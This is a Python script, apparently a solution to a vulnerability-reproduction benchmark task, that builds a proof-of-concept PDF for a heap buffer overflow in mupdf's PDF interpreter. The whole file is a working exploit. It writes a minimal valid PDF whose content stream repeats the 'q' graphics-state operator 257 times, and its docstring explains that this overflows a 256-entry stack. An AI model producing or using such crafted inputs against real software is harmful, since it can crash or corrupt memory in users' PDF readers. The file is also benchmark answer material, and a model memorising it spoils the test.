import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability, oss-fuzz:42537171, is a heap buffer overflow in mupdf's
        PDF interpreter. It occurs because the nesting depth of the graphics state
        is not checked *before* pushing a new state onto the graphics state stack.
        The stack has a hardcoded size (GSTATE_STACK_SIZE = 256 in the vulnerable version).

        Operators like 'q' (save graphics state) or 'BDC' (begin marked content)
        trigger this push operation. By calling one of these operators more than 256
        times, we can write past the end of the heap-allocated stack.

        This PoC constructs a minimal PDF file with a content stream containing the
        'q' operator repeated 257 times. The 'q' operator is chosen for its
        compactness (1 byte), which results in a very small and efficient PoC.

        Args:
            src_path: Path to the vulnerable source code tarball (not used in this solution).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # GSTATE_STACK_SIZE is 256, so 257 pushes will cause an overflow.
        repeat_count = 257
        # The 'q' operator saves the graphics state. It's a 1-byte operator.
        # We add a space as a separator.
        payload = b'q ' * repeat_count
        payload_len = len(payload)

        # Use an in-memory buffer to build the PDF and track byte offsets.
        out = io.BytesIO()

        # PDF Header
        out.write(b'%PDF-1.7\n')
        
        # Object 1: Document Catalog
        obj1_offset = out.tell()
        out.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n')

        # Object 2: Page Tree
        obj2_offset = out.tell()
        out.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n')

        # Object 3: Page Object
        obj3_offset = out.tell()
        out.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Contents 4 0 R >>\nendobj\n')

        # Object 4: Content Stream containing the payload
        obj4_offset = out.tell()
        stream_header = f'4 0 obj\n<< /Length {payload_len} >>\nstream\n'.encode('ascii')
        out.write(stream_header)
        out.write(payload)
        out.write(b'\nendstream\nendobj\n')

        # Cross-reference (xref) table
        xref_offset = out.tell()
        out.write(b'xref\n')
        out.write(b'0 5\n')
        out.write(b'0000000000 65535 f \n')
        out.write(f'{obj1_offset:010d} 00000 n \n'.encode('ascii'))
        out.write(f'{obj2_offset:010d} 00000 n \n'.encode('ascii'))
        out.write(f'{obj3_offset:010d} 00000 n \n'.encode('ascii'))
        out.write(f'{obj4_offset:010d} 00000 n \n'.encode('ascii'))

        # PDF Trailer
        out.write(b'trailer\n')
        out.write(b'<< /Size 5 /Root 1 0 R >>\n')
        out.write(b'startxref\n')
        out.write(f'{xref_offset}\n'.encode('ascii'))
        out.write(b'%%EOF\n')

        return out.getvalue()